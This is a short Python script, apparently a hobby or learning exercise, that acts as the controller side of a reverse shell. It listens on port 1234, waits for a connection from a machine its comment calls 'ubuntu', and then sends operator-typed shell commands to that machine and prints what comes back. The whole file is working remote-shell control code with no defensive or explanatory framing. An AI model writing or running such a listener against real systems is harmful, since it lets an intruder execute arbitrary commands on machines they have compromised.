import socket

# From ubuntu we will get shell
port = 1234

buffer_size = 2048

s = socket.socket()
s.bind(("", port))
s.listen(5)

# print(f"Listening as {ip}:{port} ...")
print("Listening")

c_socket, c_addr = s.accept()

print("Address of Client ", c_addr)
c_socket.send("Connection Established".encode())

while True:
    command = input("Enter the command for shell : ")
    c_socket.send(command.encode())

    if command == 'exit':
        break

    results = c_socket.recv(buffer_size).decode()
    print(results)

c_socket.close()
s.close()